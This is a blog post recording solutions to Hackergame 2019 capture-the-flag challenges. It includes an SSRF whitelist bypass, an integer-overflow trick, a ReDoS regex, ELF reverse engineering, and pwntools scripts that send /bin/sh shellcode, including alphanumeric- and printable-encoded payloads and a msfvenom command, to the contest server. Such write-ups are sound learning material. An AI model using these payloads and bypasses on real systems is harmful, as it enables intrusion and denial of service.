---
title: Hackergame2019 比赛记录
date: 2019-10-15 10:29:23
tags:
  - Javascript
  - 数学
  - SSRF
  - 整数溢出
  - DNS
  - 正则表达式
  - 古典密码与编码
categories:
  - 比赛记录
featuredImage: https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/Hackergame2019/0.png
---

开拓眼界了。

<!--more-->

## 签到题

输入 token，F12 修改 button 属性，删掉 `disabled="disabled"` 即可。

## 白与夜

下载图片直接得 flag，以前见过这类题，图片会在不同背景下显示不同图像，所以改网页背景应该也是可以的。（所以直接得到 flag 的原因可能是因为我的系统主题是黑色的）

## 信息安全 2077

F12 查看源码，发现需要特定的 UA 和 `If-Unmodified-Since` 请求头，因此先设定好 UA，然后利用 js 生成一个 2077 年 12 月的时间，仿照题目进行 `toUTCString` 转换就是需要的 `If-Unmodified-Since` 头，最后 POST 即可。

## 宇宙终极问题

### 42

[参考链接](https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42)

这也太**新**了。

```
-80538738812075974
80435758145817515
12602123297335631
```

### Everything

又要靠 [神仙网站](https://www.alpertron.com.ar/NUMBERT.HTM) 救命了。

## 网页读取器

```python
from flask import Flask, render_template, request, send_from_directory
import requests  # well, requests is designed for humans, and I like it.


app = Flask(__name__)
whitelist_hostname = ["example.com",
                     "www.example.com"]
whitelist_scheme = ["http://"]


def check_hostname(url):
    for i in whitelist_scheme:
        if url.startswith(i):
            url = url[len(i):]  # strip scheme
            url = url[url.find("@") + 1:]  # strip userinfo
            if not url.find("/") == -1:
                url = url[:url.find("/")]  # strip parts after authority
            if not url.find(":") == -1:
                url = url[:url.find(":")]  # strip port
            if url not in whitelist_hostname:
                return (False,"hostname {} not in whitelist".format(url))
            return (True,"ok")
    return (False,"scheme not in whitelist, only {} allowed".format(whitelist_scheme))


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/request")
def req_route():
    url = request.args.get('url')
    status, msg = check_hostname(url)
    if status is False:
        # print(msg)
        return msg
    try:
        r = requests.get(url, timeout=2)
        if not r.status_code == 200:
            return "We tried accessing your url, but it does not return HTTP 200. Instead, it returns {}.".format(r.status_code)
        return r.text
    except requests.Timeout:
        return "We tried our best, but it just timeout."
    except requests.RequestException:
        return "While accessing your url, an exception occurred. There may be a problem with your url."


@app.route("/source")
def get_source():
    return send_from_directory("/static/", "app.py", as_attachment=True)


if __name__ == '__main__':
    app.run("0.0.0.0", 8000, debug=False)
```

经过尝试，常规 SSRF 手段绕不过这个过滤器，但是由于没有对 `#` 进行处理，可以构造 `http://web1/flag#@example.com` 使得过滤器直接忽略 `@` 前的内容，此时再进行请求，则 `@example.com` 就会被解释为 `fragment` 了。

## 达拉崩吧大冒险

一直以为是要对 websocket 做手脚，实际上并不能成功。这里我们提升攻击力的唯一途径就是去买鸡吃，我们在买鸡的时候 F12 一下：

![图 1]({{< param cdnPrefix >}}/Hackergame2019/0.png)

发现这里的 `option` 的 `value` 是可以修改的，再看 js 代码：

![图 2]({{< param cdnPrefix >}}/Hackergame2019/1.png)

这里直接将 `option` 的 `value` 填进去了，并没有检验其合法性，因此我们可以修改这个 `value` 使得其变成一个很大的数，但是这会导致我们钱不够买不了。

将一个数变得很大，除了增加它的值，还可以将它减少成一个非常小的负数，最终导致溢出，这里就是用的第二种方法。

8 字节能构成的最小的整数是 `-9223372036854775808`。那么我们先买 `-9223372036854775808` 只鸡，再买 `-1` 只鸡，我们的攻击力就会变成一个非常大的数 `9223372036854776000`。

## Happy LUG

查一下资料可以发现这是 `PunyCode`，题目中的 emoji 表情会被编码为 `xn--g28h`，因此真实域名是 `xn--g28h.hack.ustclug.org`。这个域名无法通过浏览器访问，但是却存在，说明一定存在一条对应的 DNS 记录，我们用 `nslookup` 查一下：

```shell
$ nslookup -qt=ANY xn--g28h.hack.ustclug.org 8.8.8.8
```

就可以得到 flag。注意到返回的是 “非权威记录”，这是由于 `ANY` 类型记录 [已经被废弃了](https://tools.ietf.org/html/rfc8482)。

## 正则验证器

这些题目真的 [太新了](https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/)。

题目限制了正则长度不超过 6，字符串长度不超过 24，要求构造一个运行时间大于 1 秒的正则。实际上就是 [ReDos 攻击](https://en.wikipedia.org/wiki/ReDoS)。我们可以直接借用 wiki 上的例子：

```
(a+)+$
aaaaaaaaaaaaaaaaaaaaaaab
```

## 小巧玲珑的 ELF

IDA 打开发现有一堆字符，然后对输入进行运算后与这 45 个字符进行比对，一致则输出 `correct`，那么我们直接逆运算即可：

```python
v = [0x66,0x6E,0x65,0x6B,0x83,0x4E,0x6D,0x74,0x85,0x7A,0x6F,0x57,0x91,0x73,0x90,0x4F,0x8D,0x7F,0x63,0x36,0x6C,0x6E,0x87,0x69,0xA3,0x6F,0x58,0x73,0x66,0x56,0x93,0x9F,0x69,0x70,0x38,0x76,0x71,0x78,0x6F,0x63,0xC4,0x82,0x84,0xBE,0xBB,0xCD]

for i in range(46):
	v[i] += i
	v[i] ^= i
	v[i] -= 2*i

print(bytes(v))
```

## Shell 骇客

### 1

应该说是入门 pwn 题：

```c
// gcc -z execstack -fPIE -pie -z now chall1.c -o chall1

int main() {
    char buf[0x200];
    read(0, buf, 0x200);
    ((void(*)(void))buf)();
}
```

这里可以直接执行用户输入，因此只需要写入 `shellcode` 即可：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

# p = process('./chall1')
p = remote('202.38.93.241', 10000)

p.recvuntil(':')
p.sendline('token') # token

p.send(asm(shellcraft.sh()))

p.interactive()
```

### 2

```c
// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2
int main() {
    char buf[0x200];
    int n, i;
    n = read(0, buf, 0x200);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(!((buf[i] >= 65 && buf[i] <= 90) || (buf[i] >= 48 && buf[i] <= 57))) return 0;
    }
    ((void(*)(void))buf)();
}
```

这题在上一题的基础上限制了输入字符必须是大写字母或数字，并且是基于 x86 的。可以用类似 [ALPHA3](https://github.com/SkyLined/alpha3) 的工具对 `shellcode` 进行转换。先将 `shellcode` 写入文件：

```python
from pwn import *

with open('shellcode.bin', 'w') as f:
  f.write(asm(shellcraft.sh()))
```

随后使用 ALPHA3 进行转化：

```shell
$ py -2 ALPHA3.py x86 ascii uppercase eax --input="shellcode.bin"
```

得到的结果就是新的 payload。

```python
from pwn import *

context.log_level = 'DEBUG'

#p=process('./chall2')
p = remote('202.38.93.241', 10002)

p.recvuntil(':')
p.sendline('token') # token

p.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06')

p.interactive()
```

看到 flag 后发现，预期解是利用 `msfvenom` 生成 `shellcode`：

```shell
$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax
```

### 3

```c
// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3
int main() {
    char buf[0x400];
    int n, i;
    n = read(0, buf, 0x400);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(buf[i] <32 || buf[i] > 126) return 0;
    }
    ((void(*)(void))buf)();
}
```

本题的限制是 `shellcode` 由可打印字符构成，且基于 x64 平台。这个似乎靠 `msfvenom` 就不行了，但是可以换个工具，用 [shellcode_encoder](https://github.com/ecx86/shellcode_encoder)：

```shell
$ python2 main.py shellcode.bin rax+29
```

即可生成 payload，替换第二题的 payload 即可。注意 `rax+29` 指 shellcode 开始执行的位置。

```python
from pwn import *

context(log_level='DEBUG')

p = remote('202.38.93.241', 10004)
#p=process('./chall3')

p.recvuntil(':')
p.sendline('token') # token

p.send('''PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5>??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5>_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-<hh)-h`  5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#'-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-&@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@  5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`"|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$>I`_UXyyi;||s}_r=60d|jcEH(u'&w6~7AM;wy4II+f'Gw+X#e0T|t30Q.$A>6p?'B[A<zDBH)6f0Rj#XO$''')

p.interactive()
```
